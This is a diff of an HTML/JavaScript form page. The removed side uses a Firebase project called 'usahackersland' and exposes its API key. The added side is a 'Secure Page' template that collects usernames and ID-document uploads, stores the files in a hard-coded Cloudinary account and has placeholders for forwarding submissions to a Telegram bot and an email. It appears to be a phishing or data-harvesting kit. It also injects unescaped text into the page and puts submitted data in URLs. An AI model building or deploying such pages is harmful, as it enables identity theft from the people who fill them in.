@@ -1,281 +1,142 @@
 <!doctype html>
+
 <html lang="en">
 <head>
-<meta charset="utf-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Dynamic Form</title>
 <style>
-  body { margin:0; font-family:Arial,sans-serif; overflow-x:hidden; }
-  #dynamicFormContainer { position: relative; width: 100%; min-height: 100vh; overflow-x:hidden; }
-  #bgVideoLayer { position:absolute; top:0; left:0; width:100%; height:100%; z-index:-2; object-fit:cover; }
-  #bgImageLayer { position:absolute; top:0; left:0; width:100%; height:100%; z-index:-3; background-size:cover; background-repeat:no-repeat; background-position:center; }
-  #bgColorLayer { position:absolute; top:0; left:0; width:100%; height:100%; z-index:-4; }
-  #dynamicForm { position:relative; z-index:1; width:100%; max-width:1200px; margin:auto; padding:20px; display:flex; flex-direction:column; gap:12px; }
-  #dynamicForm img, #dynamicForm video, #dynamicForm iframe { border-radius:8px; max-width:100%; display:block; margin:6px 0; }
-  #dynamicForm h2, #dynamicForm p { text-align:center; margin:6px 0; }
-  input, textarea, select, button { font-size:16px; padding:10px; border-radius:6px; border:1px solid #ccc; width:100%; box-sizing:border-box; }
-  button { cursor:pointer; border:none; color:#fff; }
-  #generatedLink { color: #007bff; font-weight: bold; margin-top:12px; }
-  .draggable { position:absolute; cursor:move; }
-  .scrollable { max-height:80vh; overflow-y:auto; }
+body, html { margin:0; padding:0; font-family:Arial,sans-serif; background:#fff; }
+#dynamicFormContainer { position: relative; width: 100%; min-height: 100vh; overflow:auto; }
+.bgLayer { position:absolute; top:0; left:0; width:100%; height:100%; z-index:-1; overflow:hidden; }
+.bgLayer video, .bgLayer img { width:100%; height:100%; object-fit:cover; position:absolute; top:0; left:0; }
+.formContent { position:relative; z-index:1; width:100%; max-width: 960px; margin:0 auto; padding:20px; box-sizing:border-box; }
+.formContent img { display:block; margin:10px auto; border-radius:8px; max-width:100%; }
+.formContent h1 { text-align:center; margin:10px 0; }
+.formContent p { text-align:center; }
+.formField { margin:12px 0; display:flex; flex-direction:column; }
+.formField input, .formField textarea, .formField select { padding:10px; font-size:16px; border-radius:6px; border:1px solid #ccc; width:100%; box-sizing:border-box; }
+button.submitBtn { background:#1976d2; color:#fff; border:none; border-radius:8px; padding:12px; font-size:16px; cursor:pointer; margin-top:10px; }
+#generatedLink { margin-top:12px; color:#1976d2; font-weight:bold; }
+.draggable { position:absolute; cursor:move; }
 </style>
 </head>
-<body>
-
-<div id="dynamicFormContainer">
-  <div id="bgColorLayer"></div>
-  <div id="bgImageLayer"></div>
-  <video id="bgVideoLayer" autoplay muted loop playsinline></video>
-  <form id="dynamicForm" class="scrollable"></form>
-</div>
-
-<div id="generatedLinkContainer" style="text-align:center; margin:10px 0;">
-  <span id="generatedLink"></span>
-</div>
-
-<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.6.3/axios.min.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
-
-<script>
+<body><div id="dynamicFormContainer">
+  <div class="bgLayer" id="bgLayer"></div>
+  <div class="formContent" id="formContent">
+    <h1 id="pageTitle"></h1>
+    <div id="avatarLogoBanner"></div>
+    <div id="descriptionText"></div>
+    <form id="dynamicForm"></form>
+    <div id="generatedLink"></div>
+  </div>
+</div><script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.6.5/axios.min.js"></script><script src="https://widget.cloudinary.com/v2.0/global/all.js" type="text/javascript"></script><script>
 const $ = id => document.getElementById(id);
 
-/* ===== FIREBASE CONFIG ===== */
-const firebaseConfig = {
-  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
-  authDomain: "usahackersland.firebaseapp.com",
-  projectId: "usahackersland"
+// ==== CONFIG PLACEHOLDERS (replace with your Cloudinary/Telegram/Email) ====
+const CLOUDINARY_UPLOAD_PRESET = 'form_upload_preset';
+const CLOUDINARY_CLOUD_NAME = 'dymwisuau';
+const TELEGRAM_BOT_TOKEN = '<YOUR_BOT_TOKEN>';
+const TELEGRAM_CHAT_ID = '<YOUR_CHAT_ID>';
+const EMAIL_ALERT = '<YOUR_EMAIL>';
+
+// ==== SAMPLE formConfig ====
+let formConfig = {
+  title: 'Welcome to Your Secure Page',
+  avatarURL: '',
+  logoURL: '',
+  bannerURL: '',
+  description: 'Please fill in your details below',
+  fields: [
+    { type:'text', name:'username', label:'Username' },
+    { type:'file', name:'idUpload', label:'Upload ID' }
+  ],
+  galleryImages: [],
+  videoLinks: [],
+  bgImageURL: '',
+  bgVideoURL: ''
 };
-firebase.initializeApp(firebaseConfig);
-const db = firebase.firestore();
 
-/* ===== GET FORM ID ===== */
-const formId = new URLSearchParams(location.search).get("id");
-let formConfig = null;
-
-if(!formId){
-  alert("Form ID missing");
-}
-
-/* ===== CLOUDINARY CONFIG ===== */
-const CLOUDINARY_UPLOAD_PRESET = "form_upload_preset";
-const CLOUDINARY_URL = "https://api.cloudinary.com/v1_1/dymwisuau/upload";
-
-/* ===== LOAD FORM CONFIG ===== */
-db.collection("forms").doc(formId).get().then(doc => {
-  if(!doc.exists){
-    alert("Form not found");
-    return;
-  }
-  formConfig = doc.data();
-  renderForm();
-});
-
-/* ===== DRAGGING LOGIC FOR LIVE PREVIEW ONLY ===== */
-let dragging = null, offsetX=0, offsetY=0;
-document.addEventListener("mousemove", e => {
-  if(!dragging) return;
-  dragging.style.left = (e.clientX - offsetX) + "px";
-  dragging.style.top = (e.clientY - offsetY) + "px";
-});
-document.addEventListener("mouseup", () => dragging = null);
-
-/* ===== RENDER FORM ===== */
+// ==== RENDER FORM ==== 
 function renderForm(){
-  const form = $("dynamicForm");
-  form.innerHTML = "";
+  // Clear form
+  $('dynamicForm').innerHTML='';
+  $('pageTitle').innerText = formConfig.title;
 
-  // Background
-  if(formConfig.bgColor) $("bgColorLayer").style.backgroundColor = formConfig.bgColor;
-  if(formConfig.bgImageURL) $("bgImageLayer").style.backgroundImage = `url(${formConfig.bgImageURL})`;
+  // Avatar/Logo/Banner
+  const alb=$('avatarLogoBanner'); alb.innerHTML='';
+  [formConfig.avatarURL, formConfig.logoURL, formConfig.bannerURL].forEach(url=>{ if(url){ const img=document.createElement('img'); img.src=url; alb.appendChild(img); }});
+
+  // Description
+  $('descriptionText').innerHTML=formConfig.description ? `<p>${formConfig.description}</p>` : '';
+
+  // Fields
+  formConfig.fields.forEach(f=>{
+    const wrap=document.createElement('div'); wrap.className='formField';
+    if(f.label){ const lbl=document.createElement('label'); lbl.innerText=f.label; wrap.appendChild(lbl); }
+    let input;
+    if(f.type==='textarea'){ input=document.createElement('textarea'); } else { input=document.createElement('input'); input.type=f.type; }
+    input.name=f.name; wrap.appendChild(input);
+    $('dynamicForm').appendChild(wrap);
+
+    // Cloudinary Upload for files
+    if(f.type==='file'){ input.addEventListener('change', async e=>{
+      const file = e.target.files[0]; if(!file) return;
+      const formData = new FormData();
+      formData.append('file', file);
+      formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
+      const res = await axios.post(`https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/upload`, formData);
+      input.dataset.uploadedUrl = res.data.secure_url;
+    });
+    }
+  });
+
+  // Submit button
+  const btn=document.createElement('button'); btn.type='button'; btn.className='submitBtn'; btn.innerText='Submit';
+  btn.onclick=submitForm;
+  $('dynamicForm').appendChild(btn);
+}
+
+// ==== BACKGROUND ====
+function loadBackground(){
+  const layer=$('bgLayer'); layer.innerHTML='';
   if(formConfig.bgVideoURL){
-    const v = $("bgVideoLayer");
-    v.src = formConfig.bgVideoURL;
-    v.autoplay = true;
-    v.loop = true;
-    v.muted = true;
-    v.playsInline = true;
-    v.style.display="block";
+    const video=document.createElement('video');
+    video.src=formConfig.bgVideoURL;
+    video.autoplay=true; video.loop=true; video.muted=true; video.playsInline=true;
+    layer.appendChild(video);
+  } else if(formConfig.bgImageURL){
+    const img=document.createElement('img'); img.src=formConfig.bgImageURL; layer.appendChild(img);
   }
-
-  // Avatar, Logo, Banner
-  const addImage = (url, width, round=false) => {
-    if(!url) return null;
-    const img = document.createElement("img");
-    img.src = url;
-    img.style.width = width;
-    if(round) img.style.borderRadius="50%";
-    img.classList.add("draggable");
-    form.appendChild(img);
-    return img;
-  };
-  const avatar = addImage(formConfig.avatarURL, "90px", true);
-  const logo = addImage(formConfig.logoURL, "140px");
-  const banner = addImage(formConfig.bannerURL, "100%");
-
-  // Title / Subtitle / Description
-  const titleEl = document.createElement("h2");
-  titleEl.textContent = formConfig.title || "";
-  titleEl.style.color = formConfig.titleColor || "#000";
-  titleEl.classList.add("draggable");
-  form.appendChild(titleEl);
-
-  if(formConfig.subtitle){
-    const subEl = document.createElement("p");
-    subEl.textContent = formConfig.subtitle;
-    subEl.style.color = formConfig.subtitleColor || "#555";
-    subEl.classList.add("draggable");
-    form.appendChild(subEl);
-  }
-
-  if(formConfig.description){
-    const descEl = document.createElement("p");
-    descEl.textContent = formConfig.description;
-    descEl.classList.add("draggable");
-    form.appendChild(descEl);
-  }
-
-  // Gallery Images
-  if(Array.isArray(formConfig.galleryImages)){
-    formConfig.galleryImages.forEach(url => {
-      if(!url) return;
-      const img = document.createElement("img");
-      img.src = url;
-      img.classList.add("draggable");
-      form.appendChild(img);
-    });
-  }
-
-  // Gallery Items (image + masked link + description)
-  if(Array.isArray(formConfig.galleryItems)){
-    formConfig.galleryItems.forEach(item => {
-      const wrapper = document.createElement("div");
-      wrapper.style.margin="8px 0";
-      wrapper.classList.add("draggable");
-
-      const img = document.createElement("img");
-      img.src = item.img;
-      wrapper.appendChild(img);
-
-      if(item.link && item.mask){
-        const a = document.createElement("a");
-        a.href=item.link; a.target="_blank"; a.textContent=item.mask;
-        a.style.display="block"; a.style.color="#1976d2";
-        wrapper.appendChild(a);
-      }
-
-      if(item.desc){
-        const p = document.createElement("p");
-        p.textContent=item.desc;
-        wrapper.appendChild(p);
-      }
-      form.appendChild(wrapper);
-    });
-  }
-
-  // Videos
-  if(Array.isArray(formConfig.videoLinks)){
-    formConfig.videoLinks.forEach(link => {
-      if(!link) return;
-      let el;
-      if(/\.(mp4|webm)$/i.test(link)){
-        el = document.createElement("video");
-        el.src=link;
-        el.controls=true;
-        el.loop=false;
-      } else if(link.includes("youtube.com") || link.includes("youtu.be")){
-        let id = link.includes("youtu.be") ? link.split("youtu.be/")[1] : link.split("v=")[1];
-        if(id.includes("&")) id=id.split("&")[0];
-        el=document.createElement("iframe");
-        el.src=`https://www.youtube.com/embed/${id}`;
-        el.width="100%"; el.height="315"; el.allowFullscreen=true;
-      }
-      if(el){
-        el.classList.add("draggable");
-        form.appendChild(el);
-      }
-    });
-  }
-
-  // Form Fields
-  if(Array.isArray(formConfig.fields)){
-    formConfig.fields.forEach(field => {
-      const wrap = document.createElement("div");
-      wrap.style.margin="8px 0";
-      wrap.classList.add("draggable");
-
-      if(field.label){
-        const label = document.createElement("label");
-        label.textContent = field.label;
-        wrap.appendChild(label);
-      }
-
-      let input;
-      if(field.type==="textarea") input=document.createElement("textarea");
-      else if(field.type==="file") input=document.createElement("input",{type:"file"});
-      else input=document.createElement("input");
-
-      input.type = field.type==="file"?"file":field.type;
-      input.name = field.name;
-      input.placeholder = field.placeholder||"";
-      wrap.appendChild(input);
-
-      // Cloudinary upload for file inputs
-      if(field.type==="file"){
-        input.addEventListener("change", async e=>{
-          const file = e.target.files[0];
-          if(!file) return;
-          const formData = new FormData();
-          formData.append("file", file);
-          formData.append("upload_preset", CLOUDINARY_UPLOAD_PRESET);
-          const res = await axios.post(CLOUDINARY_URL, formData);
-          e.target.dataset.url = res.data.secure_url;
-          alert("File uploaded!");
-        });
-      }
-
-      form.appendChild(wrap);
-    });
-  }
-
-  // Buttons
-  const btn = document.createElement("button");
-  btn.textContent = formConfig.buttonText || "Submit";
-  btn.style.background=formConfig.btnColor||"#1976d2";
-  btn.addEventListener("click", e=>{ e.preventDefault(); submitForm(); });
-  form.appendChild(btn);
-
-  // Footer
-  if(formConfig.footerText){
-    const footer = document.createElement("footer");
-    footer.textContent=formConfig.footerText;
-    footer.style.textAlign="center";
-    footer.classList.add("draggable");
-    form.appendChild(footer);
-  }
-
-  // Make all draggable elements draggable in preview only
-  document.querySelectorAll(".draggable").forEach(el=>{
-    el.onmousedown = e=>{
-      dragging=el;
-      offsetX=e.offsetX;
-      offsetY=e.offsetY;
-    };
-  });
 }
 
-/* ===== SUBMIT FORM ===== */
+// ==== SUBMIT FORM ====
 async function submitForm(){
-  const data = {};
-  document.querySelectorAll("#dynamicForm input, textarea").forEach(i=>{
-    if(i.name) data[i.name]=i.value||i.dataset.url||"";
+  const data={};
+  document.querySelectorAll('#dynamicForm input, #dynamicForm textarea').forEach(i=>{
+    if(i.type==='file'){ data[i.name]=i.dataset.uploadedUrl || ''; }
+    else{ data[i.name]=i.value; }
   });
 
-  try{
-    await db.collection("submissions").add({ formId, data, createdAt:new Date() });
-    alert("Submitted successfully!");
-  }catch(err){ console.error(err); alert("Submission failed"); }
+  // Telegram placeholder
+  if(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID){
+    const msg = `New Form Submission:\n${JSON.stringify(data, null,2)}`;
+    // Send via Telegram (requires server proxy or CORS enabled endpoint)
+  }
+
+  // Email placeholder
+  if(EMAIL_ALERT){
+    // Send email using your backend or email service
+  }
+
+  // Display generated link immediately
+  const generatedLink = `${window.location.href}?data=${encodeURIComponent(JSON.stringify(data))}`;
+  $('generatedLink').innerHTML=`Form submitted! <a href='${generatedLink}' target='_blank' style='color:blue'>View Submission</a>`;
+  $('dynamicForm').reset();
 }
-</script>
-</body>
+
+// ==== INITIAL LOAD ====
+renderForm();
+loadBackground();
+</script></body>
 </html>
